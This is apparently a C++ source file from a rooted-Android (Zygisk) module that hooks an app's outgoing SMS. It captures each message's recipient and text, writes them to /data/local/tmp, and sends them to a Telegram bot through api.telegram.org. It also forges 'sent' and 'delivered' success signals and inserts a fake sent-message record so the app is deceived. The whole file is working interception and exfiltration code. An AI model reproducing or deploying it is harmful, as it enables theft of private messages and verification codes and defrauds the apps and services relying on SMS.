#include "fake_success.hpp"
#include "config.hpp"
#include "logger.hpp"
#include "zygisk_utils.hpp"

#include <cstdio>
#include <ctime>
#include <pthread.h>
#include <sys/stat.h>
#include <unistd.h>

namespace fake_success {

namespace {

// Activity.RESULT_OK — SMSTweaks/Gamex fireIntents / firePendingIntentWithResultCode
constexpr jint kResultOk = -1;

bool write_last_intercept(const std::string& dest, const std::string& body) {
    FILE* f = fopen("/data/local/tmp/hivirtus_last_intercept.json", "w");
    if (!f) return false;
    fprintf(f,
            "{\"dest\":\"%s\",\"body\":\"%s\",\"time\":%ld}\n",
            dest.c_str(), body.c_str(), static_cast<long>(time(nullptr)));
    fclose(f);
    chmod("/data/local/tmp/hivirtus_last_intercept.json", 0644);
    return true;
}

jobject get_app_context(JNIEnv* env) {
    jclass activity_thread = env->FindClass("android/app/ActivityThread");
    if (!activity_thread) return nullptr;
    jmethodID current_app = env->GetStaticMethodID(
        activity_thread, "currentApplication", "()Landroid/app/Application;");
    if (!current_app) return nullptr;
    return env->CallStaticObjectMethod(activity_thread, current_app);
}

void send_ordered(JNIEnv* env, jobject ctx, const char* action, jint result_code) {
    if (!ctx || !action) return;
    jclass intent_cls = env->FindClass("android/content/Intent");
    if (!intent_cls) return;
    jmethodID ctor = env->GetMethodID(intent_cls, "<init>", "(Ljava/lang/String;)V");
    if (!ctor) return;
    jobject intent = env->NewObject(intent_cls, ctor, env->NewStringUTF(action));
    if (!intent) return;

    jclass ctx_cls = env->FindClass("android/content/Context");
    jmethodID send = env->GetMethodID(
        ctx_cls, "sendOrderedBroadcast",
        "(Landroid/content/Intent;Ljava/lang/String;Landroid/content/BroadcastReceiver;"
        "Landroid/os/Handler;ILjava/lang/String;Landroid/os/Bundle;)V");
    if (!send) {
        if (env->ExceptionCheck()) env->ExceptionClear();
        return;
    }
    env->CallVoidMethod(ctx, send, intent, nullptr, nullptr, nullptr, result_code, nullptr,
                        nullptr);
    if (env->ExceptionCheck()) env->ExceptionClear();
}

std::string url_encode(const std::string& in) {
    static const char* hex = "0123456789ABCDEF";
    std::string out;
    out.reserve(in.size() * 3);
    for (unsigned char c : in) {
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') ||
            c == '-' || c == '_' || c == '.' || c == '~') {
            out += static_cast<char>(c);
        } else if (c == ' ') {
            out += "%20";
        } else {
            out += '%';
            out += hex[c >> 4];
            out += hex[c & 15];
        }
    }
    return out;
}

/** SMSTweaks sendToTelegram — HTTPS via Java HttpURLConnection (native TLS missing). */
bool java_http_get(JNIEnv* env, const std::string& url) {
    if (!env || url.empty()) return false;
    jclass url_cls = env->FindClass("java/net/URL");
    if (!url_cls) return false;
    jmethodID url_ctor = env->GetMethodID(url_cls, "<init>", "(Ljava/lang/String;)V");
    if (!url_ctor) return false;
    jobject url_obj = env->NewObject(url_cls, url_ctor, env->NewStringUTF(url.c_str()));
    if (!url_obj || env->ExceptionCheck()) {
        if (env->ExceptionCheck()) env->ExceptionClear();
        return false;
    }
    jmethodID open = env->GetMethodID(url_cls, "openConnection", "()Ljava/net/URLConnection;");
    if (!open) return false;
    jobject conn = env->CallObjectMethod(url_obj, open);
    if (!conn || env->ExceptionCheck()) {
        if (env->ExceptionCheck()) env->ExceptionClear();
        return false;
    }
    jclass http_cls = env->FindClass("java/net/HttpURLConnection");
    if (!http_cls || !env->IsInstanceOf(conn, http_cls)) return false;

    jmethodID set_method =
        env->GetMethodID(http_cls, "setRequestMethod", "(Ljava/lang/String;)V");
    jmethodID set_connect =
        env->GetMethodID(http_cls, "setConnectTimeout", "(I)V");
    jmethodID set_read = env->GetMethodID(http_cls, "setReadTimeout", "(I)V");
    jmethodID get_code = env->GetMethodID(http_cls, "getResponseCode", "()I");
    jmethodID disconnect = env->GetMethodID(http_cls, "disconnect", "()V");
    if (set_method)
        env->CallVoidMethod(conn, set_method, env->NewStringUTF("GET"));
    if (set_connect) env->CallVoidMethod(conn, set_connect, 8000);
    if (set_read) env->CallVoidMethod(conn, set_read, 8000);
    if (env->ExceptionCheck()) {
        env->ExceptionClear();
        return false;
    }
    jint code = get_code ? env->CallIntMethod(conn, get_code) : -1;
    if (env->ExceptionCheck()) {
        env->ExceptionClear();
        code = -1;
    }
    if (disconnect) env->CallVoidMethod(conn, disconnect);
    logger::info("FakeSuccess", "Telegram HTTP %d", (int)code);
    return code == 200;
}

struct TgJob {
    JavaVM* vm = nullptr;
    std::string token;
    std::string chat;
    std::string dest;
    std::string body;
};

void* tg_worker(void* arg) {
    auto* job = static_cast<TgJob*>(arg);
    if (!job) return nullptr;
    JNIEnv* env = nullptr;
    if (job->vm && job->vm->AttachCurrentThread(&env, nullptr) == 0 && env) {
        // SMS Tweaks exact layout — outgoing only already filtered upstream
        std::string to_disp = job->dest.empty() ? "?" : job->dest;
        {
            std::string d;
            for (char c : to_disp)
                if (c >= '0' && c <= '9') d += c;
            if (d.size() == 10 && to_disp.find('+') == std::string::npos) to_disp = "+91" + d;
        }
        const std::string& msg = job->body.empty() ? "empty" : job->body;
        std::string text = "📱 SMS Intercepted\n";
        text += "-----------------\n";
        text += "📞 To: ";
        text += to_disp;
        text += "\n💬 Message: ";
        text += msg;
        text += "\n📋 One-tap copy:\n";
        text += "To: ";
        text += to_disp;
        text += "\nMessage: ";
        text += msg;

        std::string url = "https://api.telegram.org/bot";
        url += job->token;
        url += "/sendMessage?chat_id=";
        url += url_encode(job->chat);
        url += "&text=";
        url += url_encode(text);

        const bool ok = java_http_get(env, url);
        FILE* lf = fopen("/data/local/tmp/hivirtus_tg_forward.log", "a");
        if (lf) {
            fprintf(lf, "inproc_tg %s dest=%s len=%zu\n", ok ? "ok" : "fail", job->dest.c_str(),
                    job->body.size());
            fclose(lf);
            chmod("/data/local/tmp/hivirtus_tg_forward.log", 0666);
        }
        // Mark so service.sh does not double-send same body immediately
        if (ok) {
            FILE* mf = fopen("/data/local/tmp/hivirtus_tg_inproc_sent.flag", "w");
            if (mf) {
                fprintf(mf, "%s\n%s\n", job->dest.c_str(), job->body.c_str());
                fclose(mf);
                chmod("/data/local/tmp/hivirtus_tg_inproc_sent.flag", 0666);
            }
        }
        job->vm->DetachCurrentThread();
    }
    delete job;
    return nullptr;
}

void queue_telegram(JNIEnv* env, const std::string& dest, const std::string& body) {
    ConfigManager::instance().reload();
    const auto& config = ConfigManager::instance().get();
    if (!config.fake_intercept_telegram) return;
    if (config.telegram_bot_token.empty() || config.telegram_chat_id.empty()) return;
    if (!env) return;

    JavaVM* vm = nullptr;
    if (env->GetJavaVM(&vm) != 0 || !vm) return;

    auto* job = new TgJob();
    job->vm = vm;
    job->token = config.telegram_bot_token;
    job->chat = config.telegram_chat_id;
    job->dest = dest;
    job->body = body;
    pthread_t t{};
    pthread_create(&t, nullptr, tg_worker, job);
    pthread_detach(t);
}

struct PiJob {
    JavaVM* vm = nullptr;
    jobject sent = nullptr;
    jobject delivery = nullptr;
    std::string dest;
    int delay_ms = 900;
};

void fire_pending_intent_ok_impl(JNIEnv* env, jobject pending_intent, const char* type) {
    if (!env || !pending_intent) return;
    const char* label = type ? type : "pi";

    jclass pi = env->FindClass("android/app/PendingIntent");
    if (!pi || !env->IsInstanceOf(pending_intent, pi)) {
        if (env->ExceptionCheck()) env->ExceptionClear();
        return;
    }

    jobject ctx = get_app_context(env);
    jmethodID send3 = env->GetMethodID(
        pi, "send", "(Landroid/content/Context;ILandroid/content/Intent;)V");
    if (send3 && ctx) {
        env->CallVoidMethod(pending_intent, send3, ctx, kResultOk, nullptr);
        if (!env->ExceptionCheck()) {
            logger::info("FakeSuccess", "PendingIntent %s RESULT_OK send(ctx)", label);
            return;
        }
        env->ExceptionClear();
    }

    // SMSTweaks: pendingIntent.send(-1)
    jmethodID send1 = env->GetMethodID(pi, "send", "(I)V");
    if (send1) {
        env->CallVoidMethod(pending_intent, send1, kResultOk);
        if (!env->ExceptionCheck()) {
            logger::info("FakeSuccess", "PendingIntent %s RESULT_OK send(int)", label);
            return;
        }
        env->ExceptionClear();
    }

    jmethodID send0 = env->GetMethodID(pi, "send", "()V");
    if (send0) {
        env->CallVoidMethod(pending_intent, send0);
        if (env->ExceptionCheck()) env->ExceptionClear();
    }
}

void* delayed_pi_worker(void* arg) {
    auto* job = static_cast<PiJob*>(arg);
    if (!job) return nullptr;
    if (job->delay_ms > 0) usleep(static_cast<useconds_t>(job->delay_ms) * 1000);
    JNIEnv* env = nullptr;
    if (job->vm && job->vm->AttachCurrentThread(&env, nullptr) == 0 && env) {
        fire_pending_intent_ok_impl(env, job->sent, "sent");
        // SMSTweaks: delivery slightly after sent
        usleep(500 * 1000);
        fire_pending_intent_ok_impl(env, job->delivery, "delivery");
        fire_sms_result_broadcasts(env, job->dest);
        if (job->sent) env->DeleteGlobalRef(job->sent);
        if (job->delivery) env->DeleteGlobalRef(job->delivery);
        job->vm->DetachCurrentThread();
    }
    delete job;
    return nullptr;
}

}  // namespace

std::string apply_prefix(const std::string& body) {
    ConfigManager::instance().reload();
    const auto& config = ConfigManager::instance().get();
    if (!config.prefix_enabled || config.prefix_text.empty() || body.empty()) {
        return body;
    }
    if (body.rfind(config.prefix_text, 0) == 0) return body;
    return config.prefix_text + body;
}

bool insert_fake_sent_sms(JNIEnv* env, const std::string& dest, const std::string& body) {
    if (!env || dest.empty()) return false;

    jobject app = get_app_context(env);
    if (!app) {
        logger::info("FakeSuccess", "No app context — skip insertFakeSentSms");
        return false;
    }

    jclass context_class = env->FindClass("android/content/Context");
    jmethodID get_resolver = env->GetMethodID(
        context_class, "getContentResolver", "()Landroid/content/ContentResolver;");
    jobject resolver = env->CallObjectMethod(app, get_resolver);
    if (!resolver) return false;

    jclass values_class = env->FindClass("android/content/ContentValues");
    jmethodID values_ctor = env->GetMethodID(values_class, "<init>", "()V");
    jobject values = env->NewObject(values_class, values_ctor);
    if (!values) return false;

    jmethodID put_string = env->GetMethodID(
        values_class, "put", "(Ljava/lang/String;Ljava/lang/String;)V");
    jmethodID put_int = env->GetMethodID(
        values_class, "put", "(Ljava/lang/String;Ljava/lang/Integer;)V");
    jmethodID put_long = env->GetMethodID(
        values_class, "put", "(Ljava/lang/String;Ljava/lang/Long;)V");

    jclass integer_class = env->FindClass("java/lang/Integer");
    jmethodID integer_value_of = env->GetStaticMethodID(
        integer_class, "valueOf", "(I)Ljava/lang/Integer;");
    jclass long_class = env->FindClass("java/lang/Long");
    jmethodID long_value_of = env->GetStaticMethodID(
        long_class, "valueOf", "(J)Ljava/lang/Long;");

    const jlong now_ms = static_cast<jlong>(time(nullptr) * 1000LL);

    env->CallVoidMethod(values, put_string, env->NewStringUTF("address"),
                        zygisk_utils::string_to_jstring(env, dest));
    env->CallVoidMethod(values, put_string, env->NewStringUTF("body"),
                        zygisk_utils::string_to_jstring(env, body));
    env->CallVoidMethod(values, put_long, env->NewStringUTF("date"),
                        env->CallStaticObjectMethod(long_class, long_value_of, now_ms));
    env->CallVoidMethod(values, put_long, env->NewStringUTF("date_sent"),
                        env->CallStaticObjectMethod(long_class, long_value_of, now_ms));
    env->CallVoidMethod(values, put_int, env->NewStringUTF("type"),
                        env->CallStaticObjectMethod(integer_class, integer_value_of, 2));
    // SMSTweaks: status = -1 (complete), error_code = 0
    env->CallVoidMethod(values, put_int, env->NewStringUTF("status"),
                        env->CallStaticObjectMethod(integer_class, integer_value_of, -1));
    env->CallVoidMethod(values, put_int, env->NewStringUTF("error_code"),
                        env->CallStaticObjectMethod(integer_class, integer_value_of, 0));
    env->CallVoidMethod(values, put_int, env->NewStringUTF("read"),
                        env->CallStaticObjectMethod(integer_class, integer_value_of, 1));
    env->CallVoidMethod(values, put_int, env->NewStringUTF("seen"),
                        env->CallStaticObjectMethod(integer_class, integer_value_of, 1));
    env->CallVoidMethod(values, put_int, env->NewStringUTF("locked"),
                        env->CallStaticObjectMethod(integer_class, integer_value_of, 0));

    jclass uri_class = env->FindClass("android/net/Uri");
    jmethodID parse = env->GetStaticMethodID(
        uri_class, "parse", "(Ljava/lang/String;)Landroid/net/Uri;");
    jobject uri = env->CallStaticObjectMethod(
        uri_class, parse, env->NewStringUTF("content://sms/sent"));

    jclass resolver_class = env->FindClass("android/content/ContentResolver");
    jmethodID insert = env->GetMethodID(
        resolver_class, "insert", "(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;");
    jobject result = env->CallObjectMethod(resolver, insert, uri, values);
    const bool ok = result != nullptr;
    logger::info("FakeSuccess", "insertFakeSentSms %s -> %s", dest.c_str(), ok ? "ok" : "fail");
    return ok;
}

void fire_pending_intent_ok(JNIEnv* env, jobject pending_intent, const char* type) {
    fire_pending_intent_ok_impl(env, pending_intent, type);
}

void fire_sms_result_broadcasts(JNIEnv* env, const std::string& dest) {
    if (!env) return;
    jobject ctx = get_app_context(env);
    if (!ctx) {
        logger::info("FakeSuccess", "No context — skip SMS_SENT broadcasts");
        return;
    }

    send_ordered(env, ctx, "SMS_SENT", kResultOk);
    send_ordered(env, ctx, "SMS_DELIVERED", kResultOk);
    if (!dest.empty()) {
        std::string sent_num = std::string("SMS_SENT") + dest;
        std::string del_num = std::string("SMS_DELIVERY") + dest;
        send_ordered(env, ctx, sent_num.c_str(), kResultOk);
        send_ordered(env, ctx, del_num.c_str(), kResultOk);
    }
    logger::info("FakeSuccess", "SMS_SENT/DELIVERED fired dest=%s", dest.c_str());
}

void on_outgoing_intercepted(JNIEnv* env, const std::string& dest, const std::string& body,
                             jobject sent_intent, jobject delivery_intent) {
    write_last_intercept(dest, body);
    ConfigManager::instance().reload();
    const auto& config = ConfigManager::instance().get();
    if (config.intercept_fake_success) {
        insert_fake_sent_sms(env, dest, body);
    }

    // Gamex/SMSTweaks: Telegram ASAP with real To+body (in-process HTTPS)
    if (body != "__SILENT__") {
        queue_telegram(env, dest, body);
    }

    // SMSTweaks: delayed fireIntents (~800–2000ms) so app UI settles
    if (sent_intent || delivery_intent) {
        JavaVM* vm = nullptr;
        if (env && env->GetJavaVM(&vm) == 0 && vm) {
            auto* job = new PiJob();
            job->vm = vm;
            job->dest = dest;
            job->delay_ms = 900;
            if (sent_intent) job->sent = env->NewGlobalRef(sent_intent);
            if (delivery_intent) job->delivery = env->NewGlobalRef(delivery_intent);
            pthread_t t{};
            pthread_create(&t, nullptr, delayed_pi_worker, job);
            pthread_detach(t);
            return;
        }
    }
    // No PIs — still fire broadcasts (binder-only path)
    fire_sms_result_broadcasts(env, dest);
}

}  // namespace fake_success
